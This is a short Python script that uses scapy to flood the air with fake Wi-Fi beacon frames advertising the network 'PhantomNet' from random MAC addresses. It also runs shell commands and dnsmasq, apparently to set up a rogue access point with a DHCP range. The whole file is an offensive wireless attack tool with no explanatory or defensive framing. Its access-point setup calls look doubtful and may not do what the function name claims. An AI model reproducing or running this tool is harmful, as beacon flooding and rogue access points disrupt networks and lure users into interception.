import os  
import time  
from scapy.all import *  

def create_ap():  
    os.system("termux-wifi-enable true")  
    os.system("termux-wifi-connection PhantomNet")  
    os.system("dnsmasq -C /dev/null -i wlan0 --dhcp-range=192.168.43.100,192.168.43.200")  

def beacon_flood():  
    while True:  
        sendp(  
            RadioTap()/  
            Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC())/  
            Dot11Beacon(cap="ESS+privacy")/  
            Dot11Elt(ID="SSID", info="PhantomNet"),  
            iface="wlan0",  
            verbose=0  
        )  
        time.sleep(0.1)  

if __name__ == "__main__":  
    create_ap()  
    beacon_flood()  
